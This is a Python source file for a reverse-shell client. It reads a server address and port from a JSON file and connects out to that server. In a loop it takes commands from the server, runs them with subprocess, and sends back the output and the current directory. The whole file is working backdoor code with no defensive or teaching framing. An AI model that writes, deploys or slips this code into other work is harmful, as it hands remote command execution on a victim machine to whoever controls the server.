import socket
import os
import subprocess
import json

f = open("serv.json")
serv = json.load(f)
f.close()


SERVER_HOST = serv["domain"]
SERVER_PORT = int(serv["port"])
BUFFER_SIZE = 1024 * 128
s = socket.socket()
# connect to the server
s.connect((SERVER_HOST, SERVER_PORT))

cwd = os.getcwd() + "> "
s.send(cwd.encode())


while True:
    # receive the command from the server
    command = s.recv(BUFFER_SIZE).decode()
    command = str(command).strip()
    print(command)

    if len(command) > 0:
        splited_command = command.split()
        if command.lower() == "exit":
            # if the command is exit, just break out of the loop
            break
        if splited_command[0].lower() == "cd":
            # cd command, change directory
            try:
                os.chdir(' '.join(splited_command[1:]))
            except FileNotFoundError as e:
                # if there is an error, set as the output
                output = str(e)
            else:
                output = ""
        else:
            output = subprocess.getoutput(command)
        cwd = os.getcwd()
        message = f"{output}\n{cwd}> "
        s.send(message.encode())
    else:
        cwd = os.getcwd()
        message = f"{cwd}> "
        s.send(message.encode())
s.close()